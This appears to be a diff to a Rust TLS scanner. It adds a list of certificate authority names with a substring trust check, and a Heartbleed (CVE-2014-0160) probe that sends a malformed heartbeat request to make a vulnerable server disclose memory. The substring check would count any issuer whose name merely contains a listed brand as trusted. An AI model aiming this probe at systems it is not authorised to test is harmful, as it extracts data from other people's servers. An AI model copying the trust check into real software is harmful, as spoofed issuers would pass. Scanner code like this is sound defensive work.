@@ -14,10 +14,42 @@
 
 pub mod tls13;
 
+use std::net::SocketAddr;
 use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::time::timeout;
+
+pub const WELL_KNOWN_CAS: &[&str] = &[
+    "Let's Encrypt",
+    "ISRG Root",
+    "DigiCert",
+    "Sectigo",
+    "GlobalSign",
+    "Amazon",
+    "Google Trust Services",
+    "GTS Root",
+    "Cloudflare",
+    "Microsoft",
+    "GoDaddy",
+    "IdenTrust",
+    "Baltimore CyberTrust",
+    "Comodo",
+    "Entrust",
+    "Trustwave",
+    "Starfield",
+    "Certum",
+    "Actalis",
+    "QuoVadis",
+    "USERTrust",
+    "Buypass",
+    "ZeroSSL",
+    "SwissSign",
+];
+
+pub fn is_trusted_issuer(issuer: &str) -> bool {
+    WELL_KNOWN_CAS.iter().any(|ca| issuer.contains(ca))
+}
 
 #[derive(Debug, Clone, Default)]
 pub struct TlsInfo {
@@ -31,6 +63,8 @@ pub struct TlsInfo {
     pub expired: bool,
     pub self_signed: bool,
     pub sans: Vec<String>, // subject alternative DNS names (capped)
+    #[allow(dead_code)]
+    pub chain_trusted: Option<bool>,
 }
 
 impl TlsInfo {
@@ -41,7 +75,11 @@ impl TlsInfo {
             bits.push(format!("CN={}", self.subject_cn));
         }
         if !self.issuer_cn.is_empty() && !self.self_signed {
-            bits.push(format!("issuer={}", self.issuer_cn));
+            if is_trusted_issuer(&self.issuer_cn) {
+                bits.push(format!("issuer={}", self.issuer_cn));
+            } else {
+                bits.push(format!("issuer={} [untrusted-CA]", self.issuer_cn));
+            }
         }
         if self.self_signed {
             bits.push("self-signed".to_string());
@@ -692,4 +730,67 @@ fn today_utc() -> (i64, u32, u32) {
     let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
     let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
     (if m <= 2 { y + 1 } else { y }, m, d)
+}
+
+/// Check if a TLS endpoint is vulnerable to Heartbleed (CVE-2014-0160).
+/// Speaks a standard TLS 1.1/1.2 ClientHello with Heartbeat extension and sends
+/// a single heartbeat query to check if memory is disclosed without proper boundary checking.
+pub async fn check_heartbleed(addr: SocketAddr, dur: Duration) -> bool {
+    let Ok(Ok(mut stream)) = timeout(dur, TcpStream::connect(addr)).await else {
+        return false;
+    };
+
+    // ClientHello offering TLS 1.1 with Heartbeat extension (0x000f, peer_allowed_to_send)
+    let hello: &[u8] = &[
+        0x16, 0x03, 0x02, 0x00, 0x31, // TLS record header (TLS 1.1 handshake, len 49)
+        0x01, 0x00, 0x00, 0x2d, // ClientHello, len 45
+        0x03, 0x02, // Client version: TLS 1.1
+        // Random (32 bytes)
+        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48,
+        0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33,
+        0xd4, 0xde, 0x00, // Session ID len 0
+        0x00, 0x04, // Cipher suites len 4
+        0x00, 0x2f, 0x00, 0x35, // TLS_RSA_WITH_AES_128_CBC_SHA, TLS_RSA_WITH_AES_256_CBC_SHA
+        0x01, 0x00, // Compression methods (null)
+        0x00, 0x05, // Extensions len 5
+        0x00, 0x0f, 0x00, 0x01, 0x01, // Heartbeat extension (peer_allowed_to_send)
+    ];
+
+    if timeout(dur, stream.write_all(hello)).await.is_err() {
+        return false;
+    }
+
+    let mut buf = vec![0u8; 4096];
+    let mut got_hello = false;
+    for _ in 0..6 {
+        let n = match timeout(dur, stream.read(&mut buf)).await {
+            Ok(Ok(n)) if n > 0 => n,
+            _ => break,
+        };
+        if buf[..n].contains(&0x16) {
+            got_hello = true;
+            break;
+        }
+    }
+
+    if !got_hello {
+        return false;
+    }
+
+    // Send malformed heartbeat request: payload length claims 16384 bytes, but body has only 1 byte
+    let heartbeat: &[u8] = &[
+        0x18, 0x03, 0x02, 0x00, 0x03, // Record: Heartbeat (0x18), TLS 1.1, len 3
+        0x01, // HeartbeatMessageType: heartbeat_request
+        0x40, 0x00, // Payload length: 16384 bytes (0x4000)
+    ];
+
+    if timeout(dur, stream.write_all(heartbeat)).await.is_err() {
+        return false;
+    }
+
+    let mut resp_buf = vec![0u8; 8192];
+    match timeout(dur, stream.read(&mut resp_buf)).await {
+        Ok(Ok(n)) if n > 5 => resp_buf[0] == 0x18 && n > 10,
+        _ => false,
+    }
 }
